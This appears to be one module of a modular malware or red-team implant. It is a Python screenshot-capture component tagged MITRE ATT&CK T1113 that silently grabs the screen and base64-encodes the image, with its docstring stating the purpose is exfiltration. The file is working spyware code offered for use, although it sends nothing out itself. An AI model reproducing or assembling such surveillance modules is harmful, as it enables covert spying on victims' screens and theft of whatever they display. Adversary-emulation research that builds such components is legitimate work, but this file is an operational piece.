"""
Module 3: Screenshot Capture
MITRE ATT&CK: T1113 (Screen Capture)
Takes screenshots and encodes them for exfiltration.
"""

import base64
import io
from datetime import datetime
from PIL import ImageGrab


def take_screenshot():
    """
    Capture the current screen and return as base64-encoded PNG.
    """
    try:
        img = ImageGrab.grab()

        buffer = io.BytesIO()
        img.save(buffer, format="PNG", optimize=True)
        img_bytes = buffer.getvalue()
        buffer.close()

        return {
            "timestamp": datetime.now().isoformat(),
            "width": img.size[0],
            "height": img.size[1],
            "size_bytes": len(img_bytes),
            "image_b64": base64.b64encode(img_bytes).decode("utf-8")
        }, None

    except Exception as e:
        return None, str(e)


if __name__ == "__main__":
    data, err = take_screenshot()
    if data:
        print(f"Screenshot captured: {data['width']}x{data['height']}, {data['size_bytes']} bytes")
    else:
        print(f"Error: {err}")
